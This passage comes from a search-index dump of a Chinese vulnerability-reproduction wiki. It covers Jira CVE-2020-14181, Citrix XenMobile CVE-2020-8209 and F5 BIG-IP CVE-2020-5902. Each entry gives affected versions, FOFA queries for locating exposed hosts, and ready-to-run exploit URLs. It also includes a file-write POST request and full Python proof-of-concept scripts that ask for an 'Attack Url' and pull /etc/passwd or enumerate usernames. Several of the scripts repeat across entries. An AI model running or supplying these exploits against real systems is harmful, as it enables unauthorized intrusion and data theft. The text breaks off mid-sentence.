https://github.com/Rival420/CVE-2020-14181/blob/main/cve-2020-1481.py import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Atlassian Jira < 7.13.6 \\033 [0m' ) print ( '+ \\033 [34mVersion: Atlassian Jira 8.0.0 - 8.5.7 \\033 [0m' ) print ( '+ \\033 [34mVersion: Atlassian Jira 8.6.0 - 8.12.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/secure/ViewUserHover.jspa?username=peiqipeiqipeiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) version = re . findall ( r '<span id=\"footer-build-information\">\\((.*?)#' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u76ee\u6807 Jira \u7248\u672c\u4e3a {} \\033 [0m\" . format ( version )) if \"peiqipeiqipeiqi\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Atlassian_Jira_user_information_disclosure","title":"Atlassian Jira \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-14181"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Jira/Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-14181/#atlassian-jira-\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e-cve-2020-14181","text":"","title":"Atlassian Jira \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e CVE-2020-14181"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Jira/Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-14181/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Jira\u5b58\u5728\u4e00\u4e2a\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u672a\u6388\u6743\u7684\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2aapi\u63a5\u53e3\u76f4\u63a5\u67e5\u8be2\u5230\u67d0\u7528\u6237\u540d\u7684\u5b58\u5728\u60c5\u51b5\uff0c\u8be5\u63a5\u53e3\u4e0d\u540c\u4e8eCVE-2019-8446\u548cCVE-2019-3403\u7684\u63a5\u53e3\uff0c\u662f\u4e00\u4e2a\u65b0\u7684\u63a5\u53e3\u3002\u5982\u679cJira\u66b4\u9732\u5728\u516c\u7f51\u4e2d\uff0c\u672a\u6388\u6743\u7528\u6237\u5c31\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u8be5\u63a5\u53e3\u7206\u7834\u51fa\u6f5c\u5728\u7684\u7528\u6237\u540d\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Jira/Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-14181/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Atlassian Jira < 7.13.6 Atlassian Jira 8.0.0 - 8.5.7 Atlassian Jira 8.6.0 - 8.12.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Jira/Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-14181/#fofa","text":"[!NOTE] app=\"Jira\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Jira/Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-14181/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6253\u5f00\u4e3b\u754c\u9762\uff0c\u6ce8\u610f\u6807\u8bc6\u4e2d\u7684 Jira\u7248\u672c\u662f\u5426\u5728\u5f71\u54cd\u4e2d \u4f7f\u7528POC\u5bf9\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\u8fdb\u884c\u9a8c\u8bc1 http://xxx.xxx.xxx.xxx/secure/ViewUserHover.jspa?username=admin \u7528\u6237\u540d\u5982\u679c\u4e0d\u5b58\u5728\u4f1a\u8fd4\u56de \u5b58\u5728\u7684\u7528\u6237\u540d\u4f1a\u8fd4\u56de \u4e0d\u5b58\u5728\u6f0f\u6d1e\u4f1a\u8fd4\u56de","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Jira/Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-14181/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] POC\u53ea\u7528\u4e8e\u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e \u7206\u7834\u53ef\u4f7f\u7528: https://github.com/Rival420/CVE-2020-14181/blob/main/cve-2020-1481.py import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Atlassian Jira < 7.13.6 \\033 [0m' ) print ( '+ \\033 [34mVersion: Atlassian Jira 8.0.0 - 8.5.7 \\033 [0m' ) print ( '+ \\033 [34mVersion: Atlassian Jira 8.6.0 - 8.12.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/secure/ViewUserHover.jspa?username=peiqipeiqipeiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) version = re . findall ( r '<span id=\"footer-build-information\">\\((.*?)#' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u76ee\u6807 Jira \u7248\u672c\u4e3a {} \\033 [0m\" . format ( version )) if \"peiqipeiqipeiqi\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Jira/Atlassian%20Jira%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-14181/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Atlassian_Jira_user_information_disclosure","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/","text":"Citrix XenMobile \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 CVE-2020-8209 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 XenMobile\u662fCitrix\u5f00\u53d1\u7684\u4f01\u4e1a\u79fb\u52a8\u6027\u7ba1\u7406\u8f6f\u4ef6\u3002\u8be5\u4ea7\u54c1\u5141\u8bb8\u4f01\u4e1a\u7ba1\u7406\u5458\u5de5\u7684\u79fb\u52a8\u8bbe\u5907\u548c\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u3002\u8be5\u8f6f\u4ef6\u7684\u76ee\u7684\u662f\u901a\u8fc7\u5141\u8bb8\u5458\u5de5\u5b89\u5168\u5730\u5728\u4f01\u4e1a\u62e5\u6709\u7684\u548c\u4e2a\u4eba\u79fb\u52a8\u8bbe\u5907\u53ca\u5e94\u7528\u7a0b\u5e8f\u4e0a\u5de5\u4f5c\u6765\u63d0\u9ad8\u751f\u4ea7\u7387\u3002 CVE-2020-8209\uff0c\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u3002\u6b64\u6f0f\u6d1e\u5141\u8bb8\u672a\u7ecf\u6388\u6743\u7684\u7528\u6237\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\uff0c\u5305\u62ec\u5305\u542b\u5bc6\u7801\u7684\u914d\u7f6e\u6587\u4ef6 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] RP2\u4e4b\u524d\u7684XenMobile\u670d\u52a1\u566810.12 RP4\u4e4b\u524d\u7684XenMobile\u670d\u52a1\u566810.11 RP6\u4e4b\u524d\u7684XenMobile\u670d\u52a1\u566810.1010.9 RP5\u4e4b\u524d\u7684XenMobile\u670d\u52a1\u5668 FOFA \u00b6 [!NOTE] title=\"XenMobile\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd \u53ef\u4ee5\u6210\u529f\u4e0b\u8f7d**/etc/passwd**\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re import urllib3 def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Citrix XenMobile \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-8209.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : urllib3 . disable_warnings ( urllib3 . exceptions . InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 10 ) print ( \" \\033 [32m[o] \u542b\u6709CVE-2020-8209\u6f0f\u6d1e\uff0c\u6210\u529f\u8bfb\u53d6/etc/passwd \\033 [0m \\n {} \" . format ( response . text )) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url > >> \\033 [0m\" )) POC_1 ( target_url )","title":"Citrix XenMobile \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 CVE-2020-8209"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/#citrix-xenmobile-\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6-cve-2020-8209","text":"","title":"Citrix XenMobile \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 CVE-2020-8209"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/#\u6f0f\u6d1e\u63cf\u8ff0","text":"XenMobile\u662fCitrix\u5f00\u53d1\u7684\u4f01\u4e1a\u79fb\u52a8\u6027\u7ba1\u7406\u8f6f\u4ef6\u3002\u8be5\u4ea7\u54c1\u5141\u8bb8\u4f01\u4e1a\u7ba1\u7406\u5458\u5de5\u7684\u79fb\u52a8\u8bbe\u5907\u548c\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u3002\u8be5\u8f6f\u4ef6\u7684\u76ee\u7684\u662f\u901a\u8fc7\u5141\u8bb8\u5458\u5de5\u5b89\u5168\u5730\u5728\u4f01\u4e1a\u62e5\u6709\u7684\u548c\u4e2a\u4eba\u79fb\u52a8\u8bbe\u5907\u53ca\u5e94\u7528\u7a0b\u5e8f\u4e0a\u5de5\u4f5c\u6765\u63d0\u9ad8\u751f\u4ea7\u7387\u3002 CVE-2020-8209\uff0c\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u3002\u6b64\u6f0f\u6d1e\u5141\u8bb8\u672a\u7ecf\u6388\u6743\u7684\u7528\u6237\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\uff0c\u5305\u62ec\u5305\u542b\u5bc6\u7801\u7684\u914d\u7f6e\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] RP2\u4e4b\u524d\u7684XenMobile\u670d\u52a1\u566810.12 RP4\u4e4b\u524d\u7684XenMobile\u670d\u52a1\u566810.11 RP6\u4e4b\u524d\u7684XenMobile\u670d\u52a1\u566810.1010.9 RP5\u4e4b\u524d\u7684XenMobile\u670d\u52a1\u5668","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/#fofa","text":"[!NOTE] title=\"XenMobile\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee http://xxx.xxx.xxx.xxx/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd \u53ef\u4ee5\u6210\u529f\u4e0b\u8f7d**/etc/passwd**\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Citrix%20XenMobile/Citrix%20XenMobile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CVE-2020-8209/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re import urllib3 def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Citrix XenMobile \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-8209.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : urllib3 . disable_warnings ( urllib3 . exceptions . InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 10 ) print ( \" \\033 [32m[o] \u542b\u6709CVE-2020-8209\u6f0f\u6d1e\uff0c\u6210\u529f\u8bfb\u53d6/etc/passwd \\033 [0m \\n {} \" . format ( response . text )) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url > >> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/","text":"F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2020-5902 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2020\u5e7407\u670803\u65e5\uff0c 360CERT\u76d1\u6d4b\u53d1\u73b0 F5 \u53d1\u5e03\u4e86 F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-5902 \uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a \u4e25\u91cd \u3002 \u672a\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u6f0f\u6d1e\u9875\u9762\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u4efb\u610f Java \u4ee3\u7801\u6267\u884c\u3002\u8fdb\u800c\u63a7\u5236 F5 BIG-IP \u7684\u5168\u90e8\u529f\u80fd\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e: \u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3001\u5f00\u542f/\u7981\u7528\u670d\u52a1\u3001\u521b\u5efa/\u5220\u9664\u670d\u52a1\u5668\u7aef\u6587\u4ef6\u7b49\u3002\u8be5\u6f0f\u6d1e\u5f71\u54cd\u63a7\u5236\u9762\u677f\u53d7\u5f71\u54cd\uff0c\u4e0d\u5f71\u54cd\u6570\u636e\u9762\u677f\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA \u00b6 [!NOTE] title=\"BIG-IP&reg ;- Redirect\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5728 tmshCmd \u7684 service \u65b9\u6cd5\u5904\u7406\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u672a\u5bf9 command \u53c2\u6570\u8fdb\u884c\u5904\u7406\uff0c\u76f4\u63a5\u8c03\u7528 WorkspaceUtils.runTmshCommand(cmd, request); \u65b9\u6cd5\u6267\u884c\u547d\u4ee4\uff0c\u9650\u5236\u4e86\u6267\u884c delete,create,list,modify \u3002 if ( \"POST\" . equalsIgnoreCase ( request . getMethod ())) { String [] cmdArray = command . split ( \" \" ); String operation = cmdArray [ 0 ] ; String module = cmdArray [ 2 ] ; if ( ! ShellCommandValidator . checkForBadShellCharacters ( command ) && ( operation . equals ( \"create\" ) || operation . equals ( \"delete\" ) || operation . equals ( \"list\" ) || operation . equals ( \"modify\" )) && WHITELISTED_TMSH_MODULES . contains ( module )) { try { String [] args = new String [] { command }; Result result = Syscall . callElevated ( Syscall . TMSH , args ); output = result . getOutput (); error = result . getError (); } catch ( CallException var11 ) { logger . error ( NLSEngine . getString ( \"ilx.workspace.error.TmshCommandFailed\" ) + \": \" + var11 . getMessage ()); error = var11 . getMessage (); } } else { error = NLSEngine . getString ( \"ilx.workspace.error.RejectedTmshCommand\" ); } \u5728 fileRead \u7684 service \u65b9\u6cd5\u5904\u7406\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u672a\u5bf9 fileName \u53c2\u6570\u8fdb\u884c\u5904\u7406\uff0c\u76f4\u63a5\u8c03\u7528 WorkspaceUtils.readFile(fileName); \u65b9\u6cd5\uff0c\u8fdb\u884c\u6587\u4ef6\u8bfb\u53d6\u3002 \u5728 fileSave \u7684 service \u65b9\u6cd5\u5904\u7406\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u672a\u5bf9 fileName \uff0c content \u53c2\u6570\u8fdb\u884c\u5904\u7406\uff0c\u76f4\u63a5\u8c03\u7528 WorkspaceUtils.saveFile(request); \u65b9\u6cd5\uff0c\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20\u3002 \u8be6\u60c5\u5229\u7528\u65b9\u5f0f https://github.com/jas502n/CVE-2020-5902 \u8be6\u60c5\u5229\u7528\u65b9\u5f0f https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md \u8bfb\u53d6\u6587\u4ef6 \u00b6 http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd \u5199\u5165\u6587\u4ef6 \u00b6 http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp POST: fileName=/tmp/PeiQi.txt&content=PceiQi \u8bfb\u53d6\u6587\u4ef6 /tmp/PeiQi \u6210\u529f\u5199\u5165\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: F5 BIG-IP \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-5902.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): version_url = target_url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept-Language\" : \"zh-CN,zh;q=0.9\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = version_url , timeout = 10 , verify = False , headers = headers ) if \"output\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( target_url , json . loads ( response . text )[ \"output\" ])) else : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528 \\033 [0m\" ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528 , {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) \u53c2\u8003\u6587\u7ae0 \u00b6 https://mochazz.github.io/2020/07/11/F5-BIG-IP%E6%9C%AA%E6%8E%88%E6%9D%83RCE(CVE-2020-5902)/#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C","title":"F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2020-5902"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/#f5-big-ip-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cve-2020-5902","text":"","title":"F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2020-5902"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-5902/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2020\u5e7407\u670803\u65e5\uff0c 360CERT\u76d1\u6d4b\u53d1\u73b0 F5 \u53d1\u5e03\u4e86 F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-5902 \uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a \u4e25\u91cd \u3002 \u672a\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u6f0f\u6d1e\u9875\u9762\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u4efb\u610f Java \u4ee3\u7801\u6267\u884c\u3002\u8fdb\u800c\u63a7\u5236 F5 BIG-IP \u7684\u5168\u90e8\u529f\u80fd\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e: 